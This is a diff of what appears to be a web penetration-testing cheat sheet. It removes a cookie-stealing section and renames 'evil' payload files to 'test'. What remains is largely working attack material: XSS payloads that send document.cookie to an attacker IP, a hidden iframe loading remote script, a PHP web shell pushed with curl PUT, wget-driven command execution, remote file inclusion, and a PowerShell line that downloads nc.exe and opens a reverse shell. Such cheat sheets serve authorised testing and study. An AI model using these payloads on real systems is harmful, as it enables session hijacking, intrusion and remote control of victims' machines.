@@ -69,14 +69,6 @@ HttpOnly - prevents JavaScript from accessing the cookie
 Secure - only send over an encrypted channel
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Cookie Stealing
-
-<script>alert(document.cookie)</script>
-
-<script>new Image().src="http://<attacker IP>/test.php?"+ document.cookie;</script>
-hacker: nc -lvp 80
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Cross-site Scripting (XSS)
 
 - Types
@@ -88,11 +80,10 @@ DOM-based XSS     Vulnerability exists in client-side code rather than server-si
 <script>alert('xss')</script>
 <script>alert(document.cookie)</script>
 
-<iframe src="http://<attacker IP/evil.js>" height="0" width="0"></iframe>
-<img src="http://<attacker IP>/doom.png" onload="javascript:alert('xss')"/>
+<iframe src="http://<attacker IP/test.js>" height="0" width="0"></iframe>
+<img src="http://<attacker IP>/test.png" onload="javascript:alert('xss')"/>
 <script>new Image().src="http://<attaker IP>/test.php?output="+document.cookie;</script>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
-
 
 # Directory Traversal
 
@@ -143,8 +134,8 @@ Once the file has been uploaded, pass base64 encoded commands to it to get basic
 - Method 2
 curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://target.com/shell.php
 
-wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo id|base64)
-wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo ifconfig|base64)
+wget -O output -o /dev/null www.target.com/test.php?cmd=$(echo id|base64)
+wget -O output -o /dev/null www.target.com/test.php?cmd=$(echo ifconfig|base64)
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Fuzzing
@@ -208,7 +199,7 @@ Firefox > Web Developer Toolbar > Information > View Response Headers
 
 # Remote File Inclusion
 
-http://target.com/test.php?page=http://<attacker IP>/evil.txt
+http://target.com/test.php?page=http://<attacker IP>/test.txt
 
 - method 2
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
